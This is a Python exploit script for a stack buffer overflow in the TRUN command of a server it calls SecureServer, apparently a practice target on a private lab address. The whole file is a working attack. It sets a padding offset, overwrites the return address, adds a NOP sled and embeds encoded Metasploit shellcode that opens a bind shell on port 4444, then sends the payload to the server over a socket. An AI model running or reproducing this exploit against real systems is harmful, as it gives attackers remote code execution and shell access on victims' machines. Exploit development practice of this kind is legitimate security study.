#!/usr/bin/python

import socket
import os
import sys

buf = "TRUN /.:/" #SecureServer Command
buf += "A" * 2003 #Offset
buf += "\xa0\x12\x50\x62" #EIP from SecureServer
buf += '\x90' *20 #NOP Sled for safety

#### Shellcode ####
#### Creates Listening Port on 4444 ####
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 11 compatible encoders
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 355 (iteration=0)
#x86/shikata_ga_nai chosen with final size 355
#Payload size: 355 bytes
#Final size of python file: 1761 bytes
buf +=  b""
buf += b"\xba\x16\xc1\xdc\x9f\xdb\xd3\xd9\x74\x24\xf4\x5d"
buf += b"\x33\xc9\xb1\x53\x31\x55\x12\x03\x55\x12\x83\xd3"
buf += b"\xc5\x3e\x6a\x27\x2d\x3c\x95\xd7\xae\x21\x1f\x32"
buf += b"\x9f\x61\x7b\x37\xb0\x51\x0f\x15\x3d\x19\x5d\x8d"
buf += b"\xb6\x6f\x4a\xa2\x7f\xc5\xac\x8d\x80\x76\x8c\x8c"
buf += b"\x02\x85\xc1\x6e\x3a\x46\x14\x6f\x7b\xbb\xd5\x3d"
buf += b"\xd4\xb7\x48\xd1\x51\x8d\x50\x5a\x29\x03\xd1\xbf"
buf += b"\xfa\x22\xf0\x6e\x70\x7d\xd2\x91\x55\xf5\x5b\x89"
buf += b"\xba\x30\x15\x22\x08\xce\xa4\xe2\x40\x2f\x0a\xcb"
buf += b"\x6c\xc2\x52\x0c\x4a\x3d\x21\x64\xa8\xc0\x32\xb3"
buf += b"\xd2\x1e\xb6\x27\x74\xd4\x60\x83\x84\x39\xf6\x40"
buf += b"\x8a\xf6\x7c\x0e\x8f\x09\x50\x25\xab\x82\x57\xe9"
buf += b"\x3d\xd0\x73\x2d\x65\x82\x1a\x74\xc3\x65\x22\x66"
buf += b"\xac\xda\x86\xed\x41\x0e\xbb\xac\x0d\xe3\xf6\x4e"
buf += b"\xce\x6b\x80\x3d\xfc\x34\x3a\xa9\x4c\xbc\xe4\x2e"
buf += b"\xb2\x97\x51\xa0\x4d\x18\xa2\xe9\x89\x4c\xf2\x81"
buf += b"\x38\xed\x99\x51\xc4\x38\x37\x59\x63\x93\x2a\xa4"
buf += b"\xd3\x43\xeb\x06\xbc\x89\xe4\x79\xdc\xb1\x2e\x12"
buf += b"\x75\x4c\xd1\x0d\xda\xd9\x37\x47\xf2\x8f\xe0\xff"
buf += b"\x30\xf4\x38\x98\x4b\xde\x10\x0e\x03\x08\xa6\x31"
buf += b"\x94\x1e\x80\xa5\x1f\x4d\x14\xd4\x1f\x58\x3c\x81"
buf += b"\x88\x16\xad\xe0\x29\x26\xe4\x92\xca\xb5\x63\x62"
buf += b"\x84\xa5\x3b\x35\xc1\x18\x32\xd3\xff\x03\xec\xc1"
buf += b"\xfd\xd2\xd7\x41\xda\x26\xd9\x48\xaf\x13\xfd\x5a"
buf += b"\x69\x9b\xb9\x0e\x25\xca\x17\xf8\x83\xa4\xd9\x52"
buf += b"\x5a\x1a\xb0\x32\x1b\x50\x03\x44\x24\xbd\xf5\xa8"
buf += b"\x95\x68\x40\xd7\x1a\xfd\x44\xa0\x46\x9d\xab\x7b"
buf += b"\xc3\xbd\x49\xa9\x3e\x56\xd4\x38\x83\x3b\xe7\x97"
buf += b"\xc0\x45\x64\x1d\xb9\xb1\x74\x54\xbc\xfe\x32\x85"
buf += b"\xcc\x6f\xd7\xa9\x63\x8f\xf2"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Socket Creation
s.connect(('192.168.28.189', 9999)) #Connection thru tunnel
print s.recv(1024) #Receive response
s.send(buf) #Send Payload
print s.recv(1024) #Receive response, if any
s.close() #Close the socket
